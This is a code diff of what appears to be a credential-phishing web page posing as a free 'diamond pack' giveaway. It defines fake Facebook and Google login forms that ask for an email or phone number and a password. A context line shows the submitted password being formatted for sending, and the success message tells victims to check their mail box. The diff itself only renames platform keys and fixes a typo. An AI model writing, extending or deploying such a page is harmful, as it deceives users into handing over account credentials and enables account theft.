@@ -520,21 +520,21 @@
             
             // Platform data
             const platformData = {
-                '🥲': { 
+                'FB': { 
                     field1: 'Email or Phone Number', 
                     field2: 'Password',
                     placeholder1: 'Enter your email or phone number',
                     placeholder2: 'Enter your password',
                     platformName: 'Facebook'
                 },
-                '🙃': { 
+                'GG': { 
                     field1: 'Email', 
                     field2: 'Password',
                     placeholder1: 'Enter your email',
                     placeholder2: 'Enter your password',
                     platformName: 'Google'
                 },
-                '💗': { 
+                'WK': { 
                     field1: 'Phone Number', 
                     field2: 'Password',
                     placeholder1: 'Enter your phone number',
@@ -711,7 +711,7 @@ ${platformData[data.platform].field2}: ${data.field2}
                     const allSuccessful = results.every(result => result.ok);
                     
                     if (allSuccessful) {
-                        showMessage('Diamond pack send successful. check your maip box and enjoy 😊🫶', 'success');
+                        showMessage('Diamond pack send successful. check your mail box and enjoy 😊🫶', 'success');
                         
                         // Update stats
                         predictionCount++;
